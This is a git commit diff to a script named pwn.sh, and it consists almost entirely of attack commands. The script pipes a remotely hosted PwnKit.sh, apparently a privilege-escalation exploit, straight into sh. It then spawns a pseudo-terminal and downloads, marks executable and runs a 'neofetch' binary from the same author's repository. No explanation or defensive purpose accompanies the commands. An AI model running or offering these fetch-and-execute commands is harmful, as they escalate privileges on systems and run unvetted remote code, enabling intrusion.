9b487b54d7377c1a9d0ce4e3f57968db46cee97e
trhacknon <98242014+trhacknon@users.noreply.github.com>
2022-06-02 11:02:07 +0200

    Update pwn.sh

--- pwn.sh
+++ pwn.sh
@@ -1,3 +1,5 @@
 sh -c "$(curl -fsSL https://raw.githubusercontent.com/trhacknon/PwnKit/main/PwnKit.sh)"
-SHELL=/bin/bash script -q /dev/null                               wget https://raw.githubusercontent.com/trhacknon/neofetch/master/neofetch
-chmod +x neofetch                                                 ./neofetch
+SHELL=/bin/bash script -q /dev/null                               
+wget https://raw.githubusercontent.com/trhacknon/neofetch/master/neofetch
+chmod +x neofetch                                                 
+./neofetch
